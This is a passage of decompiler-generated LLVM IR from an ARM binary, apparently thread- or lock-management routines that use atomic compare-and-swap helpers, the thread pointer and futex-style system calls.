  %v3_14458 = inttoptr i32 %v2_14458 to i32*
  %v4_14458 = load i32, i32* %v3_14458, align 4
  store i32 %v4_14458, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1445c = icmp eq i32 %v4_14458, 0
  br i1 %v2_1445c, label %dec_label_pc_14464, label %dec_label_pc_14388

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14388
  %v0_143a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_143a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_143a8 = add i32 %v1_143a8, %v0_143a8
  %v3_143a8 = inttoptr i32 %v2_143a8 to i32*
  %v4_143a8 = load i32, i32* %v3_143a8, align 4
  %v1_143ac = add i32 %v4_143a8, 20
  store i32 %v1_143ac, i32* %r2.global-to-local, align 4
  %v1_143b0132 = inttoptr i32 %v1_143ac to i32*
  %v2_143b0133 = load i32, i32* %v1_143b0132, align 4
  store i32 %v2_143b0133, i32* %r3.global-to-local, align 4
  %v3_143b4135 = icmp uge i32 %v2_143b0133, %v3_14394
  store i1 %v3_143b4135, i1* %cpsr_c.global-to-local, align 1
  %v9_143b4141 = icmp eq i32 %v2_143b0133, %v3_14394
  br i1 %v9_143b4141, label %dec_label_pc_143bc, label %dec_label_pc_143d4

dec_label_pc_143bc:                               ; preds = %dec_label_pc_143a8, %dec_label_pc_143bc.dec_label_pc_143b0_crit_edge
  %v0_143bc142 = phi i32 [ %v1_143b4.pre, %dec_label_pc_143bc.dec_label_pc_143b0_crit_edge ], [ %v3_14394, %dec_label_pc_143a8 ]
  store i32 %v0_143bc142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_143cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_143cc, label %dec_label_pc_143d0, label %dec_label_pc_143bc.dec_label_pc_143b0_crit_edge

dec_label_pc_143bc.dec_label_pc_143b0_crit_edge:  ; preds = %dec_label_pc_143bc
  %v0_143b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_143b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_143b0 = inttoptr i32 %v0_143b0.pre to i32*
  %v2_143b0 = load i32, i32* %v1_143b0, align 4
  store i32 %v2_143b0, i32* %r3.global-to-local, align 4
  %v3_143b4 = icmp uge i32 %v2_143b0, %v1_143b4.pre
  store i1 %v3_143b4, i1* %cpsr_c.global-to-local, align 1
  %v9_143b4 = icmp eq i32 %v2_143b0, %v1_143b4.pre
  br i1 %v9_143b4, label %dec_label_pc_143bc, label %dec_label_pc_143d4

dec_label_pc_143d0:                               ; preds = %dec_label_pc_143bc
  %v0_143d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_143d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_143d4

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143a8, %dec_label_pc_143bc.dec_label_pc_143b0_crit_edge, %dec_label_pc_143d0
  %v0_143d4 = phi i32 [ %v0_143d0, %dec_label_pc_143d0 ], [ %v2_143b0133, %dec_label_pc_143a8 ], [ %v2_143b0, %dec_label_pc_143bc.dec_label_pc_143b0_crit_edge ]
  %v1_143d4 = phi i32 [ %v0_143d0, %dec_label_pc_143d0 ], [ %v3_14394, %dec_label_pc_143a8 ], [ %v1_143b4.pre, %dec_label_pc_143bc.dec_label_pc_143b0_crit_edge ]
  %v3_143d4 = icmp uge i32 %v0_143d4, %v1_143d4
  store i1 %v3_143d4, i1* %cpsr_c.global-to-local, align 1
  %v9_143d4 = icmp eq i32 %v0_143d4, %v1_143d4
  br i1 %v9_143d4, label %dec_label_pc_143dc, label %dec_label_pc_14458.backedge

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143d4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_143f0 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_14448, %dec_label_pc_143dc
  %v0_143e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_143e0 = add i32 %v0_143e0, 4
  %v2_143e0 = inttoptr i32 %v1_143e0 to i32*
  %v3_143e0 = load i32, i32* %v2_143e0, align 4
  store i32 %v3_143e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143e4 = icmp eq i32 %v3_143e0, 0
  br i1 %v2_143e4, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_143e0
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_143e0, %bb
  %v2_143ec = xor i1 %v2_143e4, true
  call void @__pseudo_cond_branch(i1 %v2_143ec, i32 %v3_143e0)
  %v0_143f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_143f4, i32* %stack_var_-88, align 4
  %v1_143f8 = inttoptr i32 %v0_143f4 to i32*
  %v2_143f8 = load i32, i32* %v1_143f8, align 4
  store i32 %v2_143f8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143fc = icmp eq i32 %v2_143f8, 0
  store i32 %v2_143f0, i32* %r5.global-to-local, align 4
  br i1 %v2_143fc, label %dec_label_pc_14468.loopexit, label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %bb72
  %v1_14410 = add i32 %v2_143f8, 20
  store i32 %v1_14410, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14414

dec_label_pc_14414:                               ; preds = %dec_label_pc_14448.dec_label_pc_14414_crit_edge, %dec_label_pc_14410
  %v0_14418 = phi i32 [ %v0_14418.pre, %dec_label_pc_14448.dec_label_pc_14414_crit_edge ], [ %v1_14410, %dec_label_pc_14410 ]
  %v0_14414 = phi i32 [ %v0_14414.pre, %dec_label_pc_14448.dec_label_pc_14414_crit_edge ], [ %v2_143f8, %dec_label_pc_14410 ]
  %v1_14414 = add i32 %v0_14414, 20
  %v2_14414 = inttoptr i32 %v1_14414 to i32*
  %v3_14414 = load i32, i32* %v2_14414, align 4
  store i32 %v0_14418, i32* %r2.global-to-local, align 4
  store i32 %v3_14414, i32* %r4.global-to-local, align 4
  %v1_14424119 = inttoptr i32 %v0_14418 to i32*
  %v2_14424120 = load i32, i32* %v1_14424119, align 4
  store i32 %v2_14424120, i32* %r3.global-to-local, align 4
  %v3_14428122 = icmp uge i32 %v2_14424120, %v3_14414
  store i1 %v3_14428122, i1* %cpsr_c.global-to-local, align 1
  %v9_14428128 = icmp eq i32 %v2_14424120, %v3_14414
  br i1 %v9_14428128, label %dec_label_pc_14430, label %dec_label_pc_14448

dec_label_pc_14430:                               ; preds = %dec_label_pc_14414, %dec_label_pc_14430.dec_label_pc_14424_crit_edge
  %v0_14430129 = phi i32 [ %v1_14428.pre, %dec_label_pc_14430.dec_label_pc_14424_crit_edge ], [ %v3_14414, %dec_label_pc_14414 ]
  store i32 %v0_14430129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14440 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14440, label %dec_label_pc_14444, label %dec_label_pc_14430.dec_label_pc_14424_crit_edge

dec_label_pc_14430.dec_label_pc_14424_crit_edge:  ; preds = %dec_label_pc_14430
  %v0_14424.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14428.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14424 = inttoptr i32 %v0_14424.pre to i32*
  %v2_14424 = load i32, i32* %v1_14424, align 4
  store i32 %v2_14424, i32* %r3.global-to-local, align 4
  %v3_14428 = icmp uge i32 %v2_14424, %v1_14428.pre
  store i1 %v3_14428, i1* %cpsr_c.global-to-local, align 1
  %v9_14428 = icmp eq i32 %v2_14424, %v1_14428.pre
  br i1 %v9_14428, label %dec_label_pc_14430, label %dec_label_pc_14448

dec_label_pc_14444:                               ; preds = %dec_label_pc_14430
  %v0_14444 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14444, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14448

dec_label_pc_14448:                               ; preds = %dec_label_pc_14414, %dec_label_pc_14430.dec_label_pc_14424_crit_edge, %dec_label_pc_14444
  %v0_14448 = phi i32 [ %v0_14444, %dec_label_pc_14444 ], [ %v2_14424120, %dec_label_pc_14414 ], [ %v2_14424, %dec_label_pc_14430.dec_label_pc_14424_crit_edge ]
  %v1_14448 = phi i32 [ %v0_14444, %dec_label_pc_14444 ], [ %v3_14414, %dec_label_pc_14414 ], [ %v1_14428.pre, %dec_label_pc_14430.dec_label_pc_14424_crit_edge ]
  %v3_14448 = icmp uge i32 %v0_14448, %v1_14448
  store i1 %v3_14448, i1* %cpsr_c.global-to-local, align 1
  %v9_14448 = icmp eq i32 %v0_14448, %v1_14448
  store i32 %v2_143f0, i32* %r4.global-to-local, align 4
  br i1 %v9_14448, label %dec_label_pc_143e0, label %dec_label_pc_14448.dec_label_pc_14414_crit_edge

dec_label_pc_14448.dec_label_pc_14414_crit_edge:  ; preds = %dec_label_pc_14448
  %v0_14414.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14418.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14414

dec_label_pc_14464:                               ; preds = %dec_label_pc_14458.backedge, %entry
  %v0_1446c31 = phi i32 [ ptrtoint (i32* @global_var_221d4.362 to i32), %entry ], [ %v0_14458, %dec_label_pc_14458.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14468

dec_label_pc_14468.loopexit:                      ; preds = %bb72
  store i32 %v2_143f0, i32* %r6.global-to-local, align 4
  %v0_1446c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14468

dec_label_pc_14468:                               ; preds = %dec_label_pc_14468.loopexit, %dec_label_pc_14464
  %v0_1446c = phi i32 [ %v0_1446c.pre, %dec_label_pc_14468.loopexit ], [ %v0_1446c31, %dec_label_pc_14464 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1446c = add i32 %v0_1446c, 152
  %v3_1446c = inttoptr i32 %v2_1446c to i32*
  %v4_1446c = load i32, i32* %v3_1446c, align 4
  store i32 %v4_1446c, i32* %r7.global-to-local, align 4
  %v0_14470 = call i32 @__aeabi_read_tp()
  store i32 %v0_14470, i32* %r0.global-to-local, align 4
  %v1_14474 = add i32 %v4_1446c, 8
  %v2_14474 = inttoptr i32 %v1_14474 to i32*
  %v3_14474 = load i32, i32* %v2_14474, align 4
  store i32 %v3_14474, i32* %r3.global-to-local, align 4
  %v1_14478 = add i32 %v0_14470, -1168
  store i32 %v1_14478, i32* %r5.global-to-local, align 4
  %v3_1447c = icmp uge i32 %v3_14474, %v1_14478
  store i1 %v3_1447c, i1* %cpsr_c.global-to-local, align 1
  %v9_1447c = icmp eq i32 %v3_14474, %v1_14478
  br i1 %v9_1447c, label %dec_label_pc_145e4, label %dec_label_pc_14484

dec_label_pc_14484:                               ; preds = %dec_label_pc_14468
  store i32 %v4_1446c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_14490112 = inttoptr i32 %v4_1446c to i32*
  %v2_14490113 = load i32, i32* %v1_14490112, align 4
  store i32 %v2_14490113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14494115 = icmp eq i32 %v2_14490113, 0
  br i1 %v9_14494115, label %dec_label_pc_1449c, label %dec_label_pc_144b4

dec_label_pc_1449c:                               ; preds = %dec_label_pc_14484, %dec_label_pc_1449c.dec_label_pc_14490_crit_edge
  %v0_1449c116 = phi i32 [ %v1_14494.pre, %dec_label_pc_1449c.dec_label_pc_14490_crit_edge ], [ 0, %dec_label_pc_14484 ]
  store i32 %v0_1449c116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144ac, label %dec_label_pc_144b0, label %dec_label_pc_1449c.dec_label_pc_14490_crit_edge

dec_label_pc_1449c.dec_label_pc_14490_crit_edge:  ; preds = %dec_label_pc_1449c
  %v0_14490.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14494.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14490 = inttoptr i32 %v0_14490.pre to i32*
  %v2_14490 = load i32, i32* %v1_14490, align 4
  store i32 %v2_14490, i32* %r3.global-to-local, align 4
  %v3_14494 = icmp uge i32 %v2_14490, %v1_14494.pre
  store i1 %v3_14494, i1* %cpsr_c.global-to-local, align 1
  %v9_14494 = icmp eq i32 %v2_14490, %v1_14494.pre
  br i1 %v9_14494, label %dec_label_pc_1449c, label %dec_label_pc_144b4

dec_label_pc_144b0:                               ; preds = %dec_label_pc_1449c
  %v0_144b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_144b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_144b4

dec_label_pc_144b4:                               ; preds = %dec_label_pc_14484, %dec_label_pc_1449c.dec_label_pc_14490_crit_edge, %dec_label_pc_144b0
  %v0_144b4 = phi i32 [ %v0_144b0, %dec_label_pc_144b0 ], [ %v2_14490113, %dec_label_pc_14484 ], [ %v2_14490, %dec_label_pc_1449c.dec_label_pc_14490_crit_edge ]
  %v1_144b4 = phi i32 [ %v0_144b0, %dec_label_pc_144b0 ], [ 0, %dec_label_pc_14484 ], [ %v1_14494.pre, %dec_label_pc_1449c.dec_label_pc_14490_crit_edge ]
  %v3_144b4 = icmp uge i32 %v0_144b4, %v1_144b4
  store i1 %v3_144b4, i1* %cpsr_c.global-to-local, align 1
  %v9_144b4 = icmp eq i32 %v0_144b4, %v1_144b4
  br i1 %v9_144b4, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_144b4
  %v1_144b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_144b8, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_144b4, %bb73
  %v1_144bc = xor i1 %v9_144b4, true
  call void @__pseudo_cond_branch(i1 %v1_144bc, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_144c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_144c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_144c0 = add i32 %v1_144c0, 8
  %v3_144c0 = inttoptr i32 %v2_144c0 to i32*
  store i32 %v0_144c0, i32* %v3_144c0, align 4
  br label %dec_label_pc_145e4

dec_label_pc_145e4:                               ; preds = %bb74, %dec_label_pc_14468
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_144c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_144c8 = add i32 %v0_144c8, 152
  %v3_144c8 = inttoptr i32 %v2_144c8 to i32*
  %v4_144c8 = load i32, i32* %v3_144c8, align 4
  store i32 %v4_144c8, i32* %r2.global-to-local, align 4
  %v1_144cc = add i32 %v4_144c8, 4
  %v2_144cc = inttoptr i32 %v1_144cc to i32*
  %v3_144cc = load i32, i32* %v2_144cc, align 4
  %v1_144d0 = add i32 %v3_144cc, 1
  store i32 %v1_144d0, i32* %r3.global-to-local, align 4
  store i32 %v1_144d0, i32* %v2_144cc, align 4
  %v0_144d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_144d8 = add i32 %v0_144d8, 108
  %v2_144d8 = inttoptr i32 %v1_144d8 to i32*
  %v3_144d8 = load i32, i32* %v2_144d8, align 4
  store i32 %v3_144d8, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_144e0 = sub i32 0, %v3_144d8
  store i32 %v1_144e0, i32* %v2_144d8, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_144f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_144f4 = add i32 %v0_144f4, 104
  store i32 %v1_144f4, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_145e8.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_145e8 = add i32 %v0_144f4, 108
  %v3_145e8 = inttoptr i32 %v2_145e8 to i32*
  store i32 %v0_145e8.pre, i32* %v3_145e8, align 4
  %v0_145ec = load i32, i32* %r8.global-to-local, align 4
  %v1_145ec = load i32, i32* %r3.global-to-local, align 4
  %v2_145ec = add i32 %v1_145ec, %v0_145ec
  %v3_145ec = inttoptr i32 %v2_145ec to i32*
  %v4_145ec = load i32, i32* %v3_145ec, align 4
  store i32 %v4_145ec, i32* %r0.global-to-local, align 4
  %v1_145f0 = add i32 %v4_145ec, 4
  %v2_145f0 = inttoptr i32 %v1_145f0 to i32*
  %v3_145f0 = load i32, i32* %v2_145f0, align 4
  %v1_145f4 = add i32 %v3_145f0, -1
  store i32 %v1_145f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_145f8 = icmp eq i32 %v1_145f4, 0
  store i32 %v1_145f4, i32* %v2_145f0, align 4
  br i1 %v2_145f8, label %dec_label_pc_14604, label %dec_label_pc_146f4thread-pre-split

dec_label_pc_14604:                               ; preds = %dec_label_pc_145e4
  %v0_14604 = load i32, i32* %r3.global-to-local, align 4
  %v1_14604 = load i32, i32* %r0.global-to-local, align 4
  %v2_14604 = add i32 %v1_14604, 8
  %v3_14604 = inttoptr i32 %v2_14604 to i32*
  store i32 %v0_14604, i32* %v3_14604, align 4
  %v0_14608 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14608, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1460c

dec_label_pc_1460c:                               ; preds = %dec_label_pc_1463c.dec_label_pc_1460c_crit_edge, %dec_label_pc_14604
  %v0_1460c = phi i32 [ %v0_1460c.pre, %dec_label_pc_1463c.dec_label_pc_1460c_crit_edge ], [ %v0_14608, %dec_label_pc_14604 ]
  %v1_1460c = inttoptr i32 %v0_1460c to i32*
  %v2_1460c = load i32, i32* %v1_1460c, align 4
  store i32 %v2_1460c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1460c, i32* %r2.global-to-local, align 4
  %v2_14618100 = load i32, i32* %v1_1460c, align 4
  store i32 %v2_14618100, i32* %r3.global-to-local, align 4
  %v3_1461c102 = icmp uge i32 %v2_14618100, %v2_1460c
  store i1 %v3_1461c102, i1* %cpsr_c.global-to-local, align 1
  %v9_1461c108 = icmp eq i32 %v2_14618100, %v2_1460c
  br i1 %v9_1461c108, label %dec_label_pc_14624, label %dec_label_pc_1463c

dec_label_pc_14624:                               ; preds = %dec_label_pc_1460c, %dec_label_pc_14624.dec_label_pc_14618_crit_edge
  %v0_14624109 = phi i32 [ %v1_1461c.pre, %dec_label_pc_14624.dec_label_pc_14618_crit_edge ], [ %v2_1460c, %dec_label_pc_1460c ]
  store i32 %v0_14624109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14634 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14634, label %dec_label_pc_14638, label %dec_label_pc_14624.dec_label_pc_14618_crit_edge

dec_label_pc_14624.dec_label_pc_14618_crit_edge:  ; preds = %dec_label_pc_14624
  %v0_14618.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1461c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14618 = inttoptr i32 %v0_14618.pre to i32*
  %v2_14618 = load i32, i32* %v1_14618, align 4
  store i32 %v2_14618, i32* %r3.global-to-local, align 4
  %v3_1461c = icmp uge i32 %v2_14618, %v1_1461c.pre
  store i1 %v3_1461c, i1* %cpsr_c.global-to-local, align 1
  %v9_1461c = icmp eq i32 %v2_14618, %v1_1461c.pre
  br i1 %v9_1461c, label %dec_label_pc_14624, label %dec_label_pc_1463c

dec_label_pc_14638:                               ; preds = %dec_label_pc_14624
  %v0_14638 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1463c

dec_label_pc_1463c:                               ; preds = %dec_label_pc_1460c, %dec_label_pc_14624.dec_label_pc_14618_crit_edge, %dec_label_pc_14638
  %v0_14644 = phi i32 [ %v0_14638, %dec_label_pc_14638 ], [ %v2_14618100, %dec_label_pc_1460c ], [ %v2_14618, %dec_label_pc_14624.dec_label_pc_14618_crit_edge ]
  %v1_1463c = phi i32 [ %v0_14638, %dec_label_pc_14638 ], [ %v2_1460c, %dec_label_pc_1460c ], [ %v1_1461c.pre, %dec_label_pc_14624.dec_label_pc_14618_crit_edge ]
  %v3_1463c = icmp uge i32 %v0_14644, %v1_1463c
  store i1 %v3_1463c, i1* %cpsr_c.global-to-local, align 1
  %v9_1463c = icmp eq i32 %v0_14644, %v1_1463c
  br i1 %v9_1463c, label %dec_label_pc_14644, label %dec_label_pc_1463c.dec_label_pc_1460c_crit_edge

dec_label_pc_1463c.dec_label_pc_1460c_crit_edge:  ; preds = %dec_label_pc_1463c
  %v0_1460c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1460c

dec_label_pc_14644:                               ; preds = %dec_label_pc_1463c
  %v2_14644 = icmp ne i32 %v1_1463c, 0
  store i1 %v2_14644, i1* %cpsr_c.global-to-local, align 1
  %v7_14648 = icmp slt i32 %v1_1463c, 2
  br i1 %v7_14648, label %dec_label_pc_146f4thread-pre-split, label %dec_label_pc_1464c

dec_label_pc_1464c:                               ; preds = %dec_label_pc_14644
  %v0_1464c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1464c, i32* %r0.global-to-local, align 4
  %v0_14650 = load i32, i32* @r1, align 4
  %v1_14650 = add i32 %v0_14650, 129
  store i32 %v1_14650, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146f4thread-pre-split

dec_label_pc_14668:                               ; preds = %dec_label_pc_146f4thread-pre-split, %dec_label_pc_146f0
  %v0_14668 = phi i32 [ %v3_146f0, %dec_label_pc_146f0 ], [ %v0_146f4.pr, %dec_label_pc_146f4thread-pre-split ]
  %v1_14668 = inttoptr i32 %v0_14668 to i32*
  %v2_14668 = load i32, i32* %v1_14668, align 4
  store i32 %v2_14668, i32* %r3.global-to-local, align 4
  %v1_1466c = add i32 %v2_14668, 8
  %v2_1466c = inttoptr i32 %v1_1466c to i32*
  %v3_1466c = load i32, i32* %v2_1466c, align 4
  store i32 %v3_1466c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14670 = icmp eq i32 %v3_1466c, 0
  br i1 %v2_14670, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_14668
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_14668, %bb75
  %v2_14678 = xor i1 %v2_14670, true
  call void @__pseudo_cond_branch(i1 %v2_14678, i32 %v3_1466c)
  %v0_1467c = load i32, i32* %r6.global-to-local, align 4
  %v1_1467c = inttoptr i32 %v0_1467c to i32*
  %v2_1467c = load i32, i32* %v1_1467c, align 4
  store i32 %v2_1467c, i32* %r5.global-to-local, align 4
  %v1_14680 = add i32 %v2_1467c, 20
  store i32 %v1_14680, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14684

dec_label_pc_14684:                               ; preds = %dec_label_pc_146b8.dec_label_pc_14684_crit_edge, %bb76
  %v0_14688 = phi i32 [ %v0_14688.pre, %dec_label_pc_146b8.dec_label_pc_14684_crit_edge ], [ %v1_14680, %bb76 ]
  %v0_14684 = phi i32 [ %v0_14684.pre, %dec_label_pc_146b8.dec_label_pc_14684_crit_edge ], [ %v2_1467c, %bb76 ]
  %v1_14684 = add i32 %v0_14684, 20
  %v2_14684 = inttoptr i32 %v1_14684 to i32*
  %v3_14684 = load i32, i32* %v2_14684, align 4
  store i32 %v0_14688, i32* %r2.global-to-local, align 4
  store i32 %v3_14684, i32* %r4.global-to-local, align 4
  %v1_14690 = add i32 %v3_14684, -1
  store i32 %v1_14690, i32* @r1, align 4
  %v1_1469487 = inttoptr i32 %v0_14688 to i32*
  %v2_1469488 = load i32, i32* %v1_1469487, align 4
  store i32 %v2_1469488, i32* %r3.global-to-local, align 4
  %v3_1469890 = icmp uge i32 %v2_1469488, %v3_14684
  store i1 %v3_1469890, i1* %cpsr_c.global-to-local, align 1
  %v9_1469896 = icmp eq i32 %v2_1469488, %v3_14684
  br i1 %v9_1469896, label %dec_label_pc_146a0, label %dec_label_pc_146b8

dec_label_pc_146a0:                               ; preds = %dec_label_pc_14684, %dec_label_pc_146a0.dec_label_pc_14694_crit_edge
  %v0_146a097 = phi i32 [ %v1_14698.pre, %dec_label_pc_146a0.dec_label_pc_14694_crit_edge ], [ %v3_14684, %dec_label_pc_14684 ]
  store i32 %v0_146a097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_146b0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_146b0, label %dec_label_pc_146b4, label %dec_label_pc_146a0.dec_label_pc_14694_crit_edge

dec_label_pc_146a0.dec_label_pc_14694_crit_edge:  ; preds = %dec_label_pc_146a0
  %v0_14694.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14698.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14694 = inttoptr i32 %v0_14694.pre to i32*
  %v2_14694 = load i32, i32* %v1_14694, align 4
  store i32 %v2_14694, i32* %r3.global-to-local, align 4
  %v3_14698 = icmp uge i32 %v2_14694, %v1_14698.pre
  store i1 %v3_14698, i1* %cpsr_c.global-to-local, align 1
  %v9_14698 = icmp eq i32 %v2_14694, %v1_14698.pre
  br i1 %v9_14698, label %dec_label_pc_146a0, label %dec_label_pc_146b8

dec_label_pc_146b4:                               ; preds = %dec_label_pc_146a0
  %v0_146b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_146b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %dec_label_pc_14684, %dec_label_pc_146a0.dec_label_pc_14694_crit_edge, %dec_label_pc_146b4
  %v0_146c4 = phi i32 [ %v0_146b4, %dec_label_pc_146b4 ], [ %v2_1469488, %dec_label_pc_14684 ], [ %v2_14694, %dec_label_pc_146a0.dec_label_pc_14694_crit_edge ]
  %v1_146b8 = phi i32 [ %v0_146b4, %dec_label_pc_146b4 ], [ %v3_14684, %dec_label_pc_14684 ], [ %v1_14698.pre, %dec_label_pc_146a0.dec_label_pc_14694_crit_edge ]
  %v3_146b8 = icmp uge i32 %v0_146c4, %v1_146b8
  store i1 %v3_146b8, i1* %cpsr_c.global-to-local, align 1
  %v9_146b8 = icmp eq i32 %v0_146c4, %v1_146b8
  store i32 %v0_146c4, i32* %r2.global-to-local, align 4
  br i1 %v9_146b8, label %dec_label_pc_146c4, label %dec_label_pc_146b8.dec_label_pc_14684_crit_edge

dec_label_pc_146b8.dec_label_pc_14684_crit_edge:  ; preds = %dec_label_pc_146b8
  %v0_14684.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_14688.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14684

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b8
  %v2_146c4 = icmp ne i32 %v1_146b8, 0
  store i1 %v2_146c4, i1* %cpsr_c.global-to-local, align 1
  %v7_146c4 = icmp eq i32 %v1_146b8, 1
  %v0_146cc = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_146c4, label %dec_label_pc_146cc, label %dec_label_pc_146f0

dec_label_pc_146cc:                               ; preds = %dec_label_pc_146c4
  %v1_146cc = inttoptr i32 %v0_146cc to i32*
  %v2_146cc = load i32, i32* %v1_146cc, align 4
  store i32 %v2_146cc, i32* @r1, align 4
  %v1_146d0 = add i32 %v2_146cc, 24
  %v2_146d0 = inttoptr i32 %v1_146d0 to i32*
  %v3_146d0 = load i32, i32* %v2_146d0, align 4
  store i32 %v3_146d0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146d4 = icmp eq i32 %v3_146d0, 0
  br i1 %v2_146d4, label %dec_label_pc_146f0, label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %dec_label_pc_146cc
  %v1_146dc = add i32 %v2_146cc, 20
  %v2_146dc = inttoptr i32 %v1_146dc to i32*
  %v3_146dc = load i32, i32* %v2_146dc, align 4
  store i32 %v3_146dc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_146f0

dec_label_pc_146f0:                               ; preds = %dec_label_pc_146c4, %dec_label_pc_146dc, %dec_label_pc_146cc
  %v1_146f0 = add i32 %v0_146cc, 4
  %v2_146f0 = inttoptr i32 %v1_146f0 to i32*
  %v3_146f0 = load i32, i32* %v2_146f0, align 4
  store i32 %v3_146f0, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146f4 = icmp eq i32 %v3_146f0, 0
  br i1 %v2_146f4, label %dec_label_pc_146fc, label %dec_label_pc_14668

dec_label_pc_146f4thread-pre-split:               ; preds = %dec_label_pc_1464c, %dec_label_pc_14644, %dec_label_pc_145e4
  %v0_146f4.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146f411 = icmp eq i32 %v0_146f4.pr, 0
